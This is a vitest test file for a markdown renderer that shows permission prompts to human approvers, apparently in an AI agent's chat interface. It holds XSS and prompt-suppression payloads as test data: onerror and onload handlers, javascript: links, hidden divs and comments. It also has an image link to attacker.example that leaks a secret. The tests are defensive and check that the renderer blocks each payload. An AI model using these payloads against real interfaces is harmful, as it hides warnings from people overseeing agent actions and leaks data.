import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { parse } from 'svelte/compiler';
import { marked } from 'marked';
import { parseHTML } from 'linkedom';
import {
	renderPromptMarkdown,
	renderPromptSegments,
	isSafePromptHref,
	PROMPT_EMITTED_TAGS,
	PROMPT_STRIPPED_TAGS,
	PROMPT_ALLOWED_ATTR,
	VALUE_SLOT,
} from './prompt-markdown.js';

/**
 * Two measurements, because the vectors split into two kinds and neither check
 * catches both:
 *
 * - `visibleText` — for suppression that a DOM parser can actually show
 *   (`hidden`, inline `display:none`, comment nodes). It walks the tree because
 *   `html.includes(text)` would call every one of these a pass: the text stays
 *   in the string while rendering as nothing.
 * - `emittedTags` — for vectors whose damage needs a real CSS engine or parser
 *   semantics that linkedom does not implement (`<style>`, `<template>`,
 *   `<script>`, `<svg>`). Their absence from the output IS the property; asking
 *   about visibility here would measure nothing and pass vacuously.
 */

/** Elements whose text content is never shown to the reader. */
const RAW_TEXT_ELEMENTS = new Set(['SCRIPT', 'STYLE', 'TEMPLATE', 'NOSCRIPT', 'TITLE']);

function isHiddenElement(el: Element): boolean {
	const style = el.getAttribute('style') ?? '';
	return (
		el.hasAttribute('hidden') ||
		/display\s*:\s*none/i.test(style) ||
		/visibility\s*:\s*hidden/i.test(style) ||
		/opacity\s*:\s*0(?![.\d])/i.test(style)
	);
}

function visibleText(html: string): string {
	const { document } = parseHTML(`<!doctype html><html><body>${html}</body></html>`);
	const parts: string[] = [];
	const walk = (node: Node): void => {
		for (const child of Array.from(node.childNodes) as Node[]) {
			if (child.nodeType === 8) continue;
			if (child.nodeType === 3) {
				// Adjacent text nodes are one run on screen — an escaped
				// `&lt;div&gt;` arrives split across three of them, so a separator
				// here would fabricate spaces no reader ever sees.
				parts.push((child as Text).data);
				continue;
			}
			if (child.nodeType === 1) {
				const el = child as Element;
				if (RAW_TEXT_ELEMENTS.has(el.tagName) || isHiddenElement(el)) continue;
				walk(child);
				parts.push('\n');
			}
		}
	};
	walk(document.body);
	return parts.join('').replace(/[^\S\n]+/g, ' ').replace(/\n+/g, '\n').trim();
}

function emittedTags(html: string): string[] {
	const tags = new Set<string>();
	for (const match of html.matchAll(/<([a-zA-Z][a-zA-Z0-9]*)[\s/>]/g)) {
		tags.add(match[1]!.toLowerCase());
	}
	return [...tags].sort();
}

/**
 * A live `onclick=`-style handler in the output. The match is anchored inside an
 * opening tag on purpose: a bare `/\son[a-z]+=/` also fires on
 * `&lt;img/src=x onerror=…&gt;`, which is escaped TEXT and completely inert — the
 * same false positive as measuring visibility with `html.includes()`.
 */
function hasEventAttribute(html: string): boolean {
	return /<[a-zA-Z][a-zA-Z0-9]*[^>]*\son[a-z]+\s*=/i.test(html);
}

/**
 * Bare marked — NOT the full pre-fix chain, which also ran
 * `fixMarkdownPreprocessing` and `DOMPurify.sanitize` (MarkdownRenderer.svelte:33).
 * It stands in as the "no overrides" baseline: enough to prove each vector does
 * something harmful without them, which is all it is used for.
 */
function renderBareMarked(text: string): string {
	return marked.parse(text, { async: false }) as string;
}

// A mail_reply confirmation. Everything after "Subject:" comes from an arbitrary
// external sender, so the subject is the attacker's field — not model-mediated.
function replyPrompt(subject: string): string {
	return (
		`**Reply to email?**\n` +
		`**To:** sender@external.example\n` +
		`**Subject:** ${subject}\n\n` +
		`> quoted body text\n\n` +
		`⚠ **Body is 4000 chars — only the first 199 are shown above.**`
	);
}

/**
 * `kind` records what the vector does WITHOUT the overrides, so each case is
 * pinned to the specific harm it demonstrates:
 * - 'suppress' — the warning stops being visible.
 * - 'inject'   — a tag outside PROMPT_EMITTED_TAGS reaches the DOM.
 * The `is sharp` test asserts that harm really occurs on bare marked, so no case
 * can quietly degrade into a tautology that passes for both implementations.
 */
const VECTORS: ReadonlyArray<{ name: string; subject: string; kind: 'suppress' | 'inject' }> = [
	{ name: 'unclosed hidden div', subject: '<div hidden>', kind: 'suppress' },
	{ name: 'display:none div', subject: '<div style="display:none">', kind: 'suppress' },
	{ name: 'block html comment', subject: 'Re: invoice\n\n<!--', kind: 'suppress' },
	{ name: 'style element', subject: '<style>body{display:none}</style>', kind: 'inject' },
	{ name: 'template element', subject: '<template>', kind: 'inject' },
	{ name: 'nested hidden containers', subject: '<div hidden><span hidden>', kind: 'suppress' },
	// The inRawBlock family: a leading <code>/<kbd>/<pre> flips marked's lexer
	// into a raw block, where the DEFAULT text renderer returns tokens verbatim.
	// Without the `text` override these defeat the `html` override entirely.
	{ name: 'code-prefixed hidden div', subject: '<code><div hidden=>', kind: 'inject' },
	{ name: 'code-prefixed comment', subject: '<code><!--', kind: 'suppress' },
	{ name: 'kbd-prefixed hidden div', subject: '<kbd><div hidden=>', kind: 'inject' },
	{ name: 'pre-prefixed hidden div', subject: '<pre><div hidden=>', kind: 'inject' },
	{ name: 'code-prefixed svg onload', subject: '<code><svg/onload=alert(1)>', kind: 'inject' },
	{ name: 'code-prefixed img onerror', subject: '<code><img/src=x onerror=alert(1)>', kind: 'inject' },
];

describe('renderPromptMarkdown — the prompt cannot be suppressed', () => {
	for (const { name, subject } of VECTORS) {
		it(`keeps body and warning visible against ${name}`, () => {
			const visible = visibleText(renderPromptMarkdown(replyPrompt(subject)));
			expect(visible).toContain('Body is 4000 chars');
			expect(visible).toContain('quoted body text');
		});
	}

	// Guards the assertions above against measuring nothing: every vector must
	// demonstrably do harm without the overrides, or it is not a test case.
	it('every vector is sharp — bare marked really suppresses or injects', () => {
		const inert = VECTORS.filter(({ subject, kind }) => {
			const bare = renderBareMarked(replyPrompt(subject));
			return kind === 'suppress'
				? visibleText(bare).includes('Body is 4000 chars')
				: emittedTags(bare).every((tag) => PROMPT_EMITTED_TAGS.includes(tag));
		});
		expect(inert.map((v) => v.name)).toStrictEqual([]);
	});
});

describe('renderPromptMarkdown — nothing outside the expected tag set is emitted', () => {
	for (const { name, subject } of VECTORS) {
		it(`emits only expected tags against ${name}`, () => {
			const out = renderPromptMarkdown(replyPrompt(subject));
			const unexpected = emittedTags(out).filter((tag) => !PROMPT_EMITTED_TAGS.includes(tag));
			expect(unexpected).toStrictEqual([]);
			expect(hasEventAttribute(out)).toBe(false);
		});
	}

	it('renders raw html as visible text instead of structure', () => {
		const out = renderPromptMarkdown(replyPrompt('<div hidden>'));
		expect(out).not.toMatch(/<div/i);
		expect(visibleText(out)).toContain('<div hidden>');
	});

	// Pins the tag set to reality in BOTH directions. Anything marked emits is
	// either permitted or knowingly stripped — a third case would be deleted in
	// the browser and invisible to CI, which is content loss. Task lists are in
	// here specifically because `input` slipped past an earlier version of this
	// test that only checked the permitted list.
	const RICH_PROMPT = [
		'# Heading', '## Sub', '**bold** _em_ ~~del~~ `code`',
		'> quote', '- a\n- b', '1. one\n2. two', '3. third\n4. fourth', '---',
		'| a | b |\n| :-- | --: |\n| 1 | 2 |',
		'```json\n{"a":1}\n```', '[link](https://example.com)',
		'- [ ] todo\n- [x] done',
		'text with\nsingle newline',
	].join('\n\n');

	it('a full-featured prompt emits only permitted or knowingly-stripped tags', () => {
		const unaccounted = emittedTags(renderPromptMarkdown(RICH_PROMPT)).filter(
			(tag) => !PROMPT_EMITTED_TAGS.includes(tag) && !PROMPT_STRIPPED_TAGS.includes(tag),
		);
		expect(unaccounted).toStrictEqual([]);
	});

	it('really does emit every knowingly-stripped tag', () => {
		// Otherwise the list is a place to park guesses: a name nothing produces
		// looks like a considered decision while documenting nothing.
		const emitted = emittedTags(renderPromptMarkdown(RICH_PROMPT));
		expect(PROMPT_STRIPPED_TAGS.filter((tag) => !emitted.includes(tag))).toStrictEqual([]);
	});

	it('carries task-list text outside the checkbox element', () => {
		// `input` is void, so its removal by layer 2 can only cost the box. This
		// asserts the precondition — the text lives in the <li>, not the input —
		// which is what makes stripping `input` safe.
		const visible = visibleText(renderPromptMarkdown('> - [ ] todo item\n> - [x] done item'));
		expect(visible).toContain('todo item');
		expect(visible).toContain('done item');
	});

	// These two assert the CONFIGURATION, not its effect, and the distinction is
	// the honest part: layer 2 does not run in the test environment, so no test
	// here can observe an attribute being kept or dropped. They exist so that
	// removing an entry fails deliberately rather than silently — an earlier
	// version asserted `start="3"` in the output and passed with `start` absent
	// from the list, which measured nothing at all.
	it('keeps `start` permitted, so an ordered list is not renumbered', () => {
		// marked emits <ol start="3"> for `3. third`; dropping the attribute would
		// renumber it to 1, 2 and the prompt would show values its text does not.
		expect(renderPromptMarkdown('3. third\n4. fourth')).toContain('start="3"');
		expect(PROMPT_ALLOWED_ATTR).toContain('start');
	});

	it('keeps the attribute list free of anything that can carry script', () => {
		const dangerous = PROMPT_ALLOWED_ATTR.filter(
			(attr) => attr.startsWith('on') || attr === 'style' || attr === 'srcdoc',
		);
		expect(dangerous).toStrictEqual([]);
	});
});

describe('renderPromptMarkdown — content is never dropped', () => {
	// A link-reference definition renders nothing at all, so a multi-line one
	// swallows every line caught inside its title — suppression without any HTML.
	it('does not let a multi-line link-reference definition swallow lines', () => {
		const prompt = '**Allow?**\n\n[a]: https://e.example "\n\n> quoted body text\n\n⚠ **Body is 4000 chars**\n"';
		const visible = visibleText(renderPromptMarkdown(prompt));
		expect(visible).toContain('Body is 4000 chars');
		expect(visible).toContain('quoted body text');
		// Sharpness: bare marked really does swallow it.
		expect(visibleText(renderBareMarked(prompt))).not.toContain('Body is 4000 chars');
	});

	it('never emits an img, so displaying a prompt fires no outbound request', () => {
		// marked's default renderer emits <img src="…">, which loads on render —
		// an exfil channel that needs no click.
		const out = renderPromptMarkdown(replyPrompt('![t](https://attacker.example/?d=secret)'));
		expect(out).not.toMatch(/<img/i);
		expect(out).not.toContain('attacker.example');
		expect(visibleText(out)).toContain('[image: t]');
	});

	it('strips unsafe link schemes but keeps their text', () => {
		for (const href of [
			'javascript:alert(1)',
			'JaVaScRiPt:alert(1)',
			'data:text/html,<script>alert(1)</script>',
			'vbscript:msgbox',
		]) {
			const out = renderPromptMarkdown(`Click [here](${href}) now`);
			expect(out).not.toMatch(/href=/i);
			expect(visibleText(out)).toContain('here');
		}
	});

	it('keeps safe links clickable', () => {
		const out = renderPromptMarkdown('See [docs](https://example.com/a?b=1)');
		expect(out).toContain('href="https://example.com/a?b=1"');
		expect(out).toContain('rel="noreferrer noopener"');
	});

	it('isSafePromptHref refuses relative and scheme-less targets', () => {
		expect(isSafePromptHref('https://example.com')).toBe(true);
		expect(isSafePromptHref('mailto:a@b.example')).toBe(true);
		expect(isSafePromptHref('/settings')).toBe(false);
		expect(isSafePromptHref('example.com')).toBe(false);
		expect(isSafePromptHref('javascript:alert(1)')).toBe(false);
	});

	// The question is the dialog's ONLY text, so absent text must not render as
	// nothing: bare Yes/No buttons are the blank prompt this module prevents,
	// reached through a broken payload rather than an attack. A throw inside
	// {@html} has the same effect. The engine types this as a string, so this
	// covers the runtime gap.
	it('says the text is missing rather than rendering an empty prompt', () => {
		for (const bad of [undefined, null, '', 42]) {
			expect(() => renderPromptMarkdown(bad as unknown as string)).not.toThrow();
			const visible = visibleText(renderPromptMarkdown(bad as unknown as string));
			expect(visible).toContain('Prompt text unavailable');
			expect(visible).toContain('Deny unless');
		}
	});
});

describe('renderPromptMarkdown — escaping stays invisible to the reader', () => {
	// The `text` override escapes tokens marked would emit verbatim. Doing that
	// naively double-escapes anything already an entity, and the damage is
	// user-visible in ordinary prompts — a company name with an ampersand.
	it.each([
		['plain ampersand', 'Tom & Jerry GmbH', 'Tom & Jerry GmbH'],
		['pre-escaped ampersand', 'Tom &amp; Jerry', 'Tom & Jerry'],
		['url with query', 'api.example/v1?a=1&b=2', 'api.example/v1?a=1&b=2'],
		['numeric entity', 'a&#38;b', 'a&b'],
	])('renders %s as the reader expects', (_name, subject, expected) => {
		// visibleText resolves entities, so it sees what a reader sees.
		expect(visibleText(renderPromptMarkdown(`**Subject:** ${subject}`))).toContain(expected);
	});

	it('leaves a non-breaking space intact rather than showing &nbsp;', () => {
		const out = renderPromptMarkdown('**Subject:** a&nbsp;b');
		expect(out).not.toContain('&amp;nbsp;');
		expect(out).toContain('&nbsp;');
	});

	it('still escapes a bare angle bracket', () => {
		// The entity carve-out must not extend to the characters that build tags.
		expect(renderPromptMarkdown('**Subject:** 5 < 6 > 4')).not.toMatch(/<(?!\/?(p|strong|br)\b)/);
	});
});

describe('renderPromptMarkdown — the prompt still reads as intended', () => {
	it('preserves the emphasis and blockquote the previews rely on', () => {
		const out = renderPromptMarkdown(replyPrompt('Quarterly report'));
		expect(out).toContain('<strong>');
		expect(out).toContain('<blockquote>');
		expect(visibleText(out)).toContain('Quarterly report');
	});

	it('gives every field its own line', () => {
		// Single newlines separate the fields; collapsing them into one run-on
		// paragraph is what makes the fields unreadable as distinct values.
		expect(renderPromptMarkdown(replyPrompt('Quarterly report'))).toMatch(/<br\s*\/?>/);
		expect(renderBareMarked(replyPrompt('x'))).not.toMatch(/<br\s*\/?>/);
	});

	it('renders code fences without executing anything', () => {
		const out = renderPromptMarkdown('Payload:\n\n```json\n{"a":"<script>alert(1)</script>"}\n```');
		expect(out).toContain('<code');
		expect(out).not.toMatch(/<script/i);
		expect(visibleText(out)).toContain('alert(1)');
	});
});

/**
 * The segmented path — where the frame/value split actually pays off.
 *
 * The engine tags each span; here a value must be unable to become anything but
 * text. These assert the RENDERED html, not the input, because the whole point
 * is what the approver ends up looking at.
 */
describe('renderPromptSegments', () => {
	const LF = String.fromCharCode(0x0a);
	const NUL = String.fromCharCode(0);
	/**
	 * The REAL slot, imported — not a mirrored copy. A local copy made the
	 * "not a character an HTML parser deletes" assertion below compare two
	 * test-side constants, so putting the module back to NUL left it green.
	 */
	const SLOT = VALUE_SLOT;
	const frame = (text: string) => ({ kind: 'frame' as const, text });
	const value = (text: string) => ({ kind: 'value' as const, text });

	it('keeps frame markdown and renders values as text', () => {
		const out = renderPromptSegments([frame('**Host:** '), value('**not bold**')]);
		expect(out).toContain('<strong>Host:</strong>');
		expect(out).toContain('**not bold**');
		expect(out).not.toMatch(/<strong>not bold<\/strong>/);
	});

	it('a value cannot forge a field line, however many newlines it has', () => {
		const forged = `attacker.example${LF}**Host:** api.stripe.com`;
		const out = renderPromptSegments([frame('**Host:** '), value(forged)]);
		// The real label is markup; the forged one is literal text. That is the
		// difference the approver can see, and it is what the per-caller fixes
		// could only approximate.
		expect(out).toContain('<strong>Host:</strong>');
		expect(out).toContain('**Host:** api.stripe.com');
		expect((out.match(/<strong>Host:<\/strong>/g) ?? []).length).toBe(1);
	});

	it('a value cannot open a block construct', () => {
		const out = renderPromptSegments([frame('Plan: '), value(`x${LF}# heading${LF}> quote${LF}\`\`\`code`)]);
		expect(out).not.toMatch(/<h1|<blockquote|<code|<pre/);
		expect(out).toContain('# heading');
	});

	it('a value cannot introduce an element', () => {
		const out = renderPromptSegments([frame('File: '), value('<img src=x onerror=alert(1)>')]);
		expect(out).not.toMatch(/<img/i);
		expect(out).toContain('&lt;img');
	});

	it('block structure may cross a segment boundary', () => {
		// The reason values are not rendered one by one: the quote marker lives
		// in the frame and the quoted text in the value.
		const out = renderPromptSegments([
			frame('> '),
			value(`line 1${LF}line 2`),
			frame(`${LF}${LF}Estimated cost: ~$42.50`),
		]);
		expect(out).toMatch(/<blockquote>[\s\S]*line 1[\s\S]*<\/blockquote>/);
		const afterQuote = out.slice(out.lastIndexOf('</blockquote>'));
		expect(afterQuote).toContain('Estimated cost: ~$42.50');
	});

	it('a value containing the placeholder cannot shift the others', () => {
		// The placeholder is removed from every value first, so this is a
		// property we enforce rather than a collision we hope against.
		const out = renderPromptSegments([frame('A: '), value(`x${SLOT}y`), frame(' B: '), value('second')]);
		expect(out).toContain('xy');
		expect(out).toContain('second');
		expect(out).not.toContain(SLOT);
	});

	it('the placeholder is not a character an HTML parser deletes', () => {
		// The regression this pins: the slot used to be NUL, and a browser's HTML
		// parser DROPS U+0000 — `innerHTML`, `DOMParser` and `<template>` all
		// delete it outright (measured in Chrome 150). Every slot vanished inside
		// DOMPurify, `split` then found one part, and every value was silently
		// dropped: "Delete event ? This cannot be undone." with the id gone.
		//
		// It could not be caught here: DOMPurify is a no-op without a DOM, and
		// `linkedom` — the DOM this package has — PRESERVES NUL, so even a
		// DOM-mode test would have gone green. Hence the character-level assert.
		// Assert the actual property, not just "≠ NUL": a slot of 'X' passed the
		// first version of this assertion — and 'X' would split on every frame
		// that happens to contain one.
		expect(SLOT).toHaveLength(1);
		const cp = SLOT.codePointAt(0) ?? 0;
		expect(cp).toBeGreaterThanOrEqual(0xe000); // Private Use Area — unassigned,
		expect(cp).toBeLessThanOrEqual(0xf8ff);    // so it cannot occur in real text.
		// Also has to survive layer 1 untouched, in every construct it can land in.
		for (const frameText of ['x ', '**b** ', '> ', '- ', '# ']) {
			expect(renderPromptMarkdown(`${frameText}${SLOT}`)).toContain(SLOT);
		}
	});

	it('renders an all-frame prompt exactly like the unsegmented path', () => {
		const text = '**Bold** and `code`';
		expect(renderPromptSegments([frame(text)])).toBe(renderPromptMarkdown(text));
	});

	it('falls back to the missing-text notice for an empty prompt', () => {
		expect(renderPromptSegments([])).toBe(renderPromptMarkdown(''));
	});
});

/**
 * The wiring guard. There is no DOM environment or svelte plugin in the vitest
 * config, so a component test cannot exist here — which means without this,
 * reverting the call site to MarkdownRenderer would leave the whole suite green
 * and every test above would still pass while prompts rendered unsafely again.
 * Same approach as app.css.test.ts: assert against the source text.
 */
describe('ChatView wiring', () => {
	const source = readFileSync(
		new URL('../components/ChatView.svelte', import.meta.url),
		'utf-8',
	);

	it('renders the prompt through this module, segments first', () => {
		// Whitespace-tolerant: a formatter run must not silently disarm the guard.
		// Both branches are asserted, because the fallback is the one that stays
		// reachable forever (an older engine sends no segments) and the segment
		// branch is the one that carries the boundary.
		expect(source).toMatch(/pendingPermission\.segments[\s\S]{0,120}renderPromptSegments\(\s*pendingPermission\.segments\s*\)/);
		expect(source).toMatch(/renderPromptMarkdown\(\s*pendingPermission\.question\s*\)/);
		expect(source).toMatch(/import\s*\{[^}]*renderPromptSegments[^}]*\}\s*from\s*'\.\.\/utils\/prompt-markdown\.js'/);
	});

	// An allowlist of every MarkdownRenderer call, not a search for one bad
	// pattern. Matching on `content={pendingPermission.question}` was evadable by
	// a line break or a local alias (`content={q}`) — this notices any new call
	// site at all, which is the property actually wanted.
	it('routes only chat message text through the chat markdown renderer', () => {
		// All three are assistant/chat message text inside the messages loop.
		// A fourth entry appearing here is the signal to check whether it carries
		// prompt text — this list existing is what makes that visible.
		const contents = [...source.matchAll(/<MarkdownRenderer[^>]*?content=\{([^}]*)\}/gs)]
			.map((m) => m[1]!.replace(/\s+/g, ' ').trim())
			.sort();
		expect(contents).toStrictEqual(['gBlock.text', 'lg.text', 'msg.content']);
	});

	it('keeps the Allow/Deny branch on plain text', () => {
		// That branch is immune because it never parses markdown at all; losing
		// that would quietly opt the guard prompts into rendering. The question
		// goes, split into its head and its lines, to the question field, and the
		// field shows every part as a text node.
		// Read as Svelte parses it, not as text: a comment, a space inside a tag,
		// a formatter's line breaks or attribute order then neither hide markup
		// from the guard nor trip it.
		const ast = parse(source, { modern: true });
		const card = svelteNodes(ast.fragment).filter((n) => n.type === 'IfBlock' && code(source, n['test']) === 'pendingPermission&&!inBatchMode');
		expect(card).toHaveLength(1);
		const inCard = svelteNodes(card[0]);
		// Which question is the engine's own is decided by its marker, and by nothing else.
		const consts = inCard.filter((n) => n.type === 'ConstTag').map((n) => code(source, n['declaration']));
		for (const decl of [
			"constisPermissionGuard=pendingPermission.consent==='guard'",
			"constisDeepConsent=pendingPermission.consent==='deep'",
			'constsplit=splitPromptHead(pendingPermission.question,pendingPermission.segments)',
		]) expect(consts.filter((c) => c.startsWith(decl.slice(0, decl.indexOf('=') + 1)))).toEqual([decl]);
		// The engine's own confirmation is the first branch, and it holds the field and nothing else.
		const branch = inCard.filter((n) => n.type === 'IfBlock' && code(source, n['test']) === 'isPermissionGuard||isDeepConsent');
		expect(branch).toHaveLength(1);
		const shown = (branch[0]!['consequent'] as SvelteNode & { nodes: SvelteNode[] }).nodes
			.filter((n) => n.type !== 'Comment' && !(n.type === 'Text' && !String(n['data']).trim()))
			.map((n) => n.type === 'Component' ? `${String(n['name'])}:${(n['attributes'] as SvelteNode[]).map((a) => code(source, a)).sort().join(',')}` : code(source, n));
		expect(shown).toEqual([
			'{@constsplit=splitPromptHead(pendingPermission.question,pendingPermission.segments)}',
			'PromptQuestionField:bind:tooLow={promptTooLow},head={split.head},lines={split.lines}',
		]);
		// The card renders markup once, inside the other branch: the model's own question.
		const otherBranch = svelteNodes(branch[0]!['alternate']);
		const html = inCard.filter((n) => n.type === 'HtmlTag');
		expect(html).toHaveLength(1);
		expect(otherBranch).toContain(html[0]);
		// Nor any other way to markup in the card: no further component, snippet, action or binding.
		expect(inCard.filter((n) => n.type === 'Component').map((n) => n['name'])).toEqual(['PromptQuestionField']);
		expect(inCard.filter((n) => n.type === 'RenderTag').map((n) => code(source, n))).toEqual(['{@renderpromptOrigin(pendingPermission.origin)}']);
		expect(inCard.filter((n) => /^(Svelte|UseDirective|AttachTag)/.test(n.type))).toEqual([]);
		expect(inCard.filter((n) => n.type === 'BindDirective').map((n) => n['name'])).toEqual(['tooLow']);
		const origin = svelteNodes(ast).filter((n) => n.type === 'SnippetBlock' && code(source, n['expression']) === 'promptOrigin');
		expect(origin).toHaveLength(1);
		expect(svelteNodes(origin[0]!['body']).filter((n) => /^(HtmlTag|RenderTag|Component|Svelte|UseDirective|AttachTag)/.test(n.type))).toEqual([]);
		// Nowhere else in the view is there markup but the chat error's own links: a
		// second card under another condition cannot render the question.
		const allHtml = svelteNodes(ast).filter((n) => n.type === 'HtmlTag');
		expect(allHtml).toHaveLength(2);
		expect(allHtml.filter((n) => n !== html[0]).map((n) => code(source, n['expression']).slice(0, 18))).toEqual(['chatError.replace(']);

		// The field: plain elements and text, and a script that only measures and scrolls.
		const fieldSource = readFileSync(new URL('../components/PromptQuestionField.svelte', import.meta.url), 'utf-8');
		const field = parse(fieldSource, { modern: true });
		const inField = svelteNodes(field);
		expect(inField.filter((n) => /^(HtmlTag|RenderTag|Component|Svelte|UseDirective|AttachTag|ImportExpression)/.test(n.type))).toEqual([]);
		// Its markup as a whole, classes included: every line and the head shown as text, none
		// hidden, clipped or left out, no further element or attribute, no stylesheet of its own.
		// A change here is a change to the boundary and is made on purpose, by updating this line.
		const markup = (field.fragment.nodes as SvelteNode[])
			.filter((n) => n.type !== 'Comment' && !(n.type === 'Text' && !String(n['data']).trim()))
			.map((n) => code(fieldSource, n)).join('');
		expect(markup).toBe("<divdata-prompt-questionclass='flexmin-h-0min-w-0flex-1flex-coltext-smtext-text-mutedfont-sansleading-relaxed'>{#ifhead.length>0}<divdata-prompt-headclass='shrink-0whitespace-pre-wrap[overflow-wrap:anywhere]'>{#eachheadasseg,i(i)}{#ifseg.kind==='value'}<spandata-prompt-valueclass='text-text'>{seg.text}</span>{:else}{seg.text}{/if}{/each}</div>{/if}<divclass='relativeflexmin-h-0flex-1flex-col'><predata-prompt-fieldbind:this={field}onscroll={schedule}class='min-h-0flex-1max-h-64overflow-y-autoscrollbar-thinwhitespace-pre-wrapfont-sans[overflow-wrap:anywhere]'>{#eachlinesasline,i(i)}<spandata-prompt-lineclass='blockmin-h-[1lh]'>{line}</span>{/each}</pre>{#ifbelow>0}<divdata-prompt-fadeclass='pointer-events-noneabsoluteinset-x-0bottom-0h-8bg-gradient-to-tfrom-bg-subtleto-transparent'></div>{/if}</div>{#ifbelow>0}<divclass='flexshrink-0justify-endpt-1'><buttondata-prompt-read-moretype='button'onclick={readOn}class='whitespace-nowraprounded-[var(--radius-sm)]borderborder-borderbg-bgpx-2py-0.5text-xstext-text-mutedhover:text-text'>{label}<spanaria-hidden='true'>↓</span></button></div>{/if}</div>");
		expect(field.css).toBeNull();
		// What it shows are the props as given: nothing in the script derives or reassigns them.
		expect(inField.filter((n) => n.type === 'VariableDeclarator' && code(fieldSource, n).includes('$props(')).map((n) => code(fieldSource, n)))
			.toEqual(['{head,lines,tooLow=$bindable(false)}:Props=$props()']);
		const names = (n: SvelteNode): string[] => svelteNodes(n).filter((x) => x.type === 'Identifier').map((x) => String(x['name']));
		expect(inField.filter((n) => (n.type === 'VariableDeclarator' && !code(fieldSource, n).includes('$props(') && names(n['id'] as SvelteNode).some((x) => x === 'head' || x === 'lines'))
			|| (n.type === 'AssignmentExpression' && names(n['left'] as SvelteNode).some((x) => x === 'head' || x === 'lines')))).toEqual([]);
		expect(inField.filter((n) => n.type === 'ImportDeclaration').map((n) => (n['source'] as SvelteNode)['value']).sort())
			.toEqual(['../i18n.svelte.js', '../utils/pipeline-status.js', '../utils/prompt-head.js', 'svelte']);
		// Every DOM call is named, none is computed, and no property is written: a
		// way to markup (innerHTML, setHTMLUnsafe, a parser) cannot slip in under a known name.
		const members = inField.filter((n) => n.type === 'MemberExpression');
		expect(members.filter((n) => n['computed'])).toEqual([]);
		const called = inField.filter((n) => n.type === 'CallExpression' && (n['callee'] as SvelteNode).type === 'MemberExpression')
			.map((n) => ((n['callee'] as SvelteNode)['property'] as SvelteNode)['name']);
		expect([...new Set(called)].sort()).toEqual(['addEventListener', 'closest', 'disconnect', 'getBoundingClientRect', 'map', 'max', 'observe', 'querySelectorAll', 'removeEventListener', 'scrollBy']);
		expect(inField.filter((n) => n.type === 'AssignmentExpression' && (n['left'] as SvelteNode).type !== 'Identifier')).toEqual([]);
	});
});

type SvelteNode = { type: string; start: number; end: number; [key: string]: unknown };
/** Every node under `root`, the template's and the script's alike, comments included as their own kind. */
function svelteNodes(root: unknown, out: SvelteNode[] = []): SvelteNode[] {
	if (Array.isArray(root)) { for (const child of root) svelteNodes(child, out); return out; }
	if (!root || typeof root !== 'object') return out;
	const node = root as SvelteNode;
	if (typeof node.type === 'string') out.push(node);
	for (const [key, value] of Object.entries(node)) if (key !== 'parent' && key !== 'metadata') svelteNodes(value, out);
	return out;
}
/** A node's source without comments, whitespace or a choice of quotes, so a formatter run changes nothing. */
function code(source: string, node: unknown): string {
	const n = node as SvelteNode;
	return source.slice(n.start, n.end).replace(/<!--[\s\S]*?-->/g, '').replace(/\s+/g, '').replace(/"/g, "'");
}
